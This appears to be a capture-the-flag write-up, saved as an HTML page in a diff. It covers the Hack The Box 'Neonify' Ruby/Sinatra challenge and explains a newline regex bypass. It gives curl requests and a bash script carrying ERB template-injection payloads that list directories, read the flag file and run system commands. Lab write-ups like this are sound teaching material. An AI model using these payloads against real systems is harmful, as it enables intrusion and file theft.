@@ -1,0 +1,176 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Description: It&rsquo;s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!"><title>Neonify</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://hakbrain.xyz//icon.png><link href=https://hakbrain.xyz/styles.f40f9c8ac1c106641723dab5233fc67c.min.css rel=stylesheet><link href=https://hakbrain.xyz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://hakbrain.xyz/js/darkmode.8bfc78cc60cc5da6df81ec79c82c3775.min.js></script>
+<script src=https://hakbrain.xyz/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
+<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
+<script src=https://hakbrain.xyz/js/popover.abe6a51cc7138c5dff00f151dd627ad1.min.js></script>
+<script src=https://hakbrain.xyz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
+<script src=https://hakbrain.xyz/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
+<script src=https://hakbrain.xyz/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
+<script>const BASE_URL="https://hakbrain.xyz/",fetchData=Promise.all([fetch("https://hakbrain.xyz/indices/linkIndex.e929f21b64609a1cff6c8d7cb2c80853.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://hakbrain.xyz/indices/contentIndex.89f31280a301f3fe10c8409da4257491.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://hakbrain.xyz",!0,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://hakbrain.xyz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/hakbrain.xyz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
+    attachSPARouting(init, render)
+  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://hakbrain.xyz/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://hakbrain.xyz/>🕸️ H@kBr4in</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Neonify</h1><p class=meta>Last updated
+Feb 23, 2023
+<a href=https://github.com/vlagh3/hakbrain/tree/hugo/content/write-ups/htb/Neonify.md rel=noopener>Edit Source</a></p><ul class=tags><li><a href=https://hakbrain.xyz/tags/writeups/>Writeups</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#enumeration>Enumeration</a><ol><li><a href=#website>Website</a></li><li><a href=#source-code>Source Code</a></li></ol></li><li><a href=#exploitation>Exploitation</a><ol><li><a href=#regex-bypass>Regex Bypass</a></li><li><a href=#stti>STTI</a></li></ol></li><li><a href=#refs>Refs</a></li><li><a href=#see-also>See Also</a></li></ol></nav></details></aside><p><strong>Description</strong>: It&rsquo;s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!</p><a href=#enumeration><h2 id=enumeration><span class=hanchor arialabel=Anchor># </span>Enumeration</h2></a><p>The challenge provides us with the source code. However, before diving into it I like to just see what I&rsquo;m dealing with & play around a little. Then review the deployment stack for anything useful.</p><a href=#website><h3 id=website><span class=hanchor arialabel=Anchor># </span>Website</h3></a><p><img src="/write-ups/images/Pasted image 20230223144324.png" width=auto></p><p>Nothing to crazy, it seems to be a single page web app that contains a simple form that <code>POST</code>s to <code>/</code> with the <code>neon</code> parameter which returns our input with a glow style.</p><p>First thing I thought was to try XSS, but it seems that the app is filtering our input in some way in the backend, since I got a <strong>Malicious Input Detected</strong> message with a simple <code>&lt;</code>. I was curious to find out what chars are filtered, but it looks like most of them are.</p><p>Also note that the web app is built with
+<a href=https://sinatrarb.com/ rel=noopener>sinatra</a> &ndash; a framework for creating web applications in Ruby with minimal effort:</p><p><img src="/write-ups/images/Pasted image 20230223173542.png" width=auto></p><a href=#source-code><h3 id=source-code><span class=hanchor arialabel=Anchor># </span>Source Code</h3></a><p>It&rsquo;s probably the time to dive into the source code to see how the filtering is done & get a better idea of what we&rsquo;re dealing with. Aaaand it&rsquo;s in ruby&mldr;. Guess i should&rsquo;ve figured it out by the 4 giant rubies in front of me</p><p><img src="https://media3.giphy.com/media/U4VXRfcY3zxTi/200.webp?cid=ecf05e47l1mnwe1kookbqls2vl9m39nde75107etpjk7r073&rid=200.webp&ct=g" width=auto alt></p><p>There&rsquo;s just 1 file worth noting here <code>neon.rb</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=k>class</span> <span class=nc>NeonControllers</span> <span class=o>&lt;</span> <span class=no>Sinatra</span><span class=o>::</span><span class=no>Base</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>configure</span> <span class=k>do</span>
+</span></span><span class=line><span class=cl>    <span class=n>set</span> <span class=ss>:views</span><span class=p>,</span> <span class=s2>&#34;app/views&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>set</span> <span class=ss>:public_dir</span><span class=p>,</span> <span class=s2>&#34;public&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=k>end</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>get</span> <span class=s1>&#39;/&#39;</span> <span class=k>do</span>
+</span></span><span class=line><span class=cl>    <span class=vi>@neon</span> <span class=o>=</span> <span class=s2>&#34;Glow With The Flow&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>erb</span> <span class=ss>:&#39;index&#39;</span>
+</span></span><span class=line><span class=cl>  <span class=k>end</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>post</span> <span class=s1>&#39;/&#39;</span> <span class=k>do</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>params</span><span class=o>[</span><span class=ss>:neon</span><span class=o>]</span> <span class=o>=~</span> <span class=sr>/^[0-9a-z ]+$/i</span>
+</span></span><span class=line><span class=cl>      <span class=vi>@neon</span> <span class=o>=</span> <span class=no>ERB</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>params</span><span class=o>[</span><span class=ss>:neon</span><span class=o>]</span><span class=p>)</span><span class=o>.</span><span class=n>result</span><span class=p>(</span><span class=nb>binding</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>      <span class=vi>@neon</span> <span class=o>=</span> <span class=s2>&#34;Malicious Input Detected&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>end</span>
+</span></span><span class=line><span class=cl>    <span class=n>erb</span> <span class=ss>:&#39;index&#39;</span>
+</span></span><span class=line><span class=cl>  <span class=k>end</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>end</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>The <code>neon</code> parameter that is <code>POST</code>ed is passed further into the template, handled by
+<a href=https://rubyapi.org/o/erb rel=noopener>ERB</a></li><li>There&rsquo;s a regex validation which only allows alphanumeric chars, numbers and spaces</li></ul><p>So it will require a 2 step aproach: a Server Side Template Injection <em>(STTI)</em> and finding a way to bypass the validation regex</p><a href=#exploitation><h2 id=exploitation><span class=hanchor arialabel=Anchor># </span>Exploitation</h2></a><a href=#regex-bypass><h3 id=regex-bypass><span class=hanchor arialabel=Anchor># </span>Regex Bypass</h3></a><p>First we need to find a way to bypass the regex. Taking a look at the regex with on
+<a href=https://rubular.com/ rel=noopener>online regex editor</a> allowed me to play with & understand it more:</p><ul><li><code>^[0-9a-z ]</code> - start of line accepts only alphanumeric chars, numbers and spaces</li><li><code>+$</code> - indicates the end of line</li><li><code>i</code> - case insensitive</li></ul><p>As it turns out, because it only checks our input from the start to the end of the 1st line, we can bypass it by simply adding a new line which will not be validated by the regex:</p><p><img src="/write-ups/images/Pasted image 20230223174949.png" width=auto></p><blockquote><p>Apparently
+<a href=https://docs.guardrails.io/docs/vulnerabilities/ruby/insecure_use_of_regular_expressions rel=noopener>the secure way of doing this</a> is to replace <code>^</code> with <code>\A</code> and <code>$</code> with <code>\z</code></p></blockquote><p>We can test this using curl:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>╰─ curl -X POST -d <span class=s1>&#39;neon=wow%0A&lt;&gt;/;[]all of this is now allowed&#39;</span> http://165.22.118.85:31202
+</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
+</span></span><span class=line><span class=cl>&lt;html&gt;
+</span></span><span class=line><span class=cl>&lt;head&gt;
+</span></span><span class=line><span class=cl>    &lt;title&gt;Neonify&lt;/title&gt;
+</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;stylesheets/style.css&#34;</span>&gt;
+</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;icon&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;image/gif&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/images/gem.gif&#34;</span>&gt;
+</span></span><span class=line><span class=cl>&lt;/head&gt;
+</span></span><span class=line><span class=cl>&lt;body&gt;
+</span></span><span class=line><span class=cl>    &lt;div <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;wrapper&#34;</span>&gt;
+</span></span><span class=line><span class=cl>        &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;title&#34;</span>&gt;Amazing Neonify Generator&lt;/h1&gt;
+</span></span><span class=line><span class=cl>        &lt;form <span class=nv>action</span><span class=o>=</span><span class=s2>&#34;/&#34;</span> <span class=nv>method</span><span class=o>=</span><span class=s2>&#34;post&#34;</span>&gt;
+</span></span><span class=line><span class=cl>            &lt;p&gt;Enter Text to Neonify&lt;/p&gt;&lt;br&gt;
+</span></span><span class=line><span class=cl>            &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;neon&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;
+</span></span><span class=line><span class=cl>            &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;submit&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;Submit&#34;</span>&gt;
+</span></span><span class=line><span class=cl>        &lt;/form&gt;
+</span></span><span class=line><span class=cl>        &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;glow&#34;</span>&gt;wow
+</span></span><span class=line><span class=cl>&lt;&gt;/<span class=p>;</span><span class=o>[]</span>all of this is now allowed&lt;/h1&gt;
+</span></span><span class=line><span class=cl>    &lt;/div&gt;
+</span></span><span class=line><span class=cl>&lt;/body&gt;
+</span></span><span class=line><span class=cl>&lt;/html&gt;
+</span></span></code></pre></td></tr></table></div></div><a href=#stti><h3 id=stti><span class=hanchor arialabel=Anchor># </span>STTI</h3></a><p>Moving on to actually testing it with a STTI payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># notice the empty space before %0A </span>
+</span></span><span class=line><span class=cl><span class=c1># this is required to properly run the payload</span>
+</span></span><span class=line><span class=cl>╰─ curl -X POST -d <span class=s1>&#39;neon= %0A&lt;%= 7*7 %&gt;&#39;</span> http://165.22.118.85:31202
+</span></span><span class=line><span class=cl>Invalid query parameters: invalid %-encoding <span class=o>(</span>%0A<span class=p>&amp;</span>amp<span class=p>;</span>lt<span class=p>;</span>%<span class=o>=</span> 7*7 %<span class=p>&amp;</span>amp<span class=p>;</span>gt<span class=p>;</span><span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>This is not working because we need to urlencode it, so after doing this we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>╰─ curl -X POST -d <span class=s1>&#39;neon= %0A%3c%25%3d%20%37%2a%37%20%25%3e%0a%0a%0a%0a%0a%0a&#39;</span> http://165.22.118.85:31202
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>&lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;glow&#34;</span>&gt;
+</span></span><span class=line><span class=cl>	<span class=m>49</span>
+</span></span><span class=line><span class=cl>&lt;/h1&gt;
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></td></tr></table></div></div><p>Now that we have confirmed our template injection,
+<a href=https://www.trustedsec.com/blog/rubyerb-template-injection/ rel=noopener>let&rsquo;s look @ how we can read files or execute system commands</a>. We can also create a simple bash script to make things easier:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=nv>URL</span><span class=o>=</span><span class=s2>&#34;http://165.22.118.85:31202/&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>pay</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span> <span class=p>|</span> xxd -p<span class=p>|</span>tr -d <span class=se>\\</span>n<span class=p>|</span>sed <span class=s1>&#39;s/../%&amp;/g&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>curl -X POST -d <span class=s2>&#34;neon= %0a</span><span class=nv>$pay</span><span class=s2>&#34;</span> <span class=nv>$URL</span>
+</span></span></code></pre></td></tr></table></div></div><p>Then just use it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># list dirs</span>
+</span></span><span class=line><span class=cl>╰─ bash exp.sh <span class=s2>&#34;&lt;%= Dir.entries(&#39;/&#39;) %&gt;&#34;</span>
+</span></span><span class=line><span class=cl>&lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;glow&#34;</span>&gt;
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=s2>&#34;lib&#34;</span>, <span class=s2>&#34;var&#34;</span>, <span class=s2>&#34;proc&#34;</span>, <span class=s2>&#34;usr&#34;</span>, <span class=s2>&#34;dev&#34;</span>, <span class=s2>&#34;bin&#34;</span>, <span class=s2>&#34;media&#34;</span>, <span class=s2>&#34;..&#34;</span>, <span class=s2>&#34;opt&#34;</span>, <span class=s2>&#34;root&#34;</span>, <span class=s2>&#34;mnt&#34;</span>, <span class=s2>&#34;sbin&#34;</span>, <span class=s2>&#34;etc&#34;</span>, <span class=s2>&#34;sys&#34;</span>, <span class=s2>&#34;run&#34;</span>, <span class=s2>&#34;srv&#34;</span>, <span class=s2>&#34;tmp&#34;</span>, <span class=s2>&#34;.&#34;</span>, <span class=s2>&#34;home&#34;</span>, <span class=s2>&#34;app&#34;</span><span class=o>]</span>
+</span></span><span class=line><span class=cl>&lt;/h1&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># read files</span>
+</span></span><span class=line><span class=cl>╰─ bash exp.sh <span class=s2>&#34;&lt;%= File.open(&#39;./flag.txt&#39;).read %&gt;&#34;</span>
+</span></span><span class=line><span class=cl>&lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;glow&#34;</span>&gt;
+</span></span><span class=line><span class=cl>HTB<span class=o>{</span>r3******3n7_s3*****y<span class=o>}</span>
+</span></span><span class=line><span class=cl>&lt;/h1&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># exec cmd</span>
+</span></span><span class=line><span class=cl>╰─ bash exp.sh <span class=s1>&#39;&lt;%= `id` %&gt;&#39;</span>
+</span></span><span class=line><span class=cl>&lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;glow&#34;</span>&gt;
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>www<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>www<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>www<span class=o>)</span>
+</span></span><span class=line><span class=cl>&lt;/h1&gt;
+</span></span></code></pre></td></tr></table></div></div><a href=#refs><h2 id=refs><span class=hanchor arialabel=Anchor># </span>Refs</h2></a><ul><li><a href=https://app.hackthebox.com/challenges/303 rel=noopener>challenge</a></li><li><a href=https://rubular.com/ rel=noopener>rubular</a></li><li><a href=https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby rel=noopener>haktricks STTI</a></li></ul><a href=#see-also><h2 id=see-also><span class=hanchor arialabel=Anchor># </span>See Also</h2></a><ul><li><a href=/write-ups/HTB rel=noopener class=internal-link data-src=/write-ups/HTB>write-ups/HTB</a></li></ul></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://hakbrain.xyz/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Made by Vl@gh3 using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2023</p><ul><li><a href=https://hakbrain.xyz/>Home</a></li><li><a href=https://twitter.com/vlaghe1>Twitter</a></li><li><a href=https://github.com/vlagh3>Github</a></li></ul></footer></div></div></body></html>
